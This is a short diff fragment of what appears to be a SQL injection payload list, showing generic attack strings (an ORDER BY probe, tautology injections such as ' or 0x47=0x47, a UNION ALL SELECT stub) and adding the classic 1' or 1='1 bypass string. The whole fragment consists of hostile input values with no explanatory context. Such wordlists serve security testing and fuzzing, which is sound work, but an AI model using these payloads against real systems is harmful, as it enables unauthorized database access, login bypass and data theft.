@@ -18,3 +18,4 @@ order by 100--
 ' or 0x47=0x47or char(32)=''
 or 6 is not null
 UNION ALL SELECT
+1' or 1='1
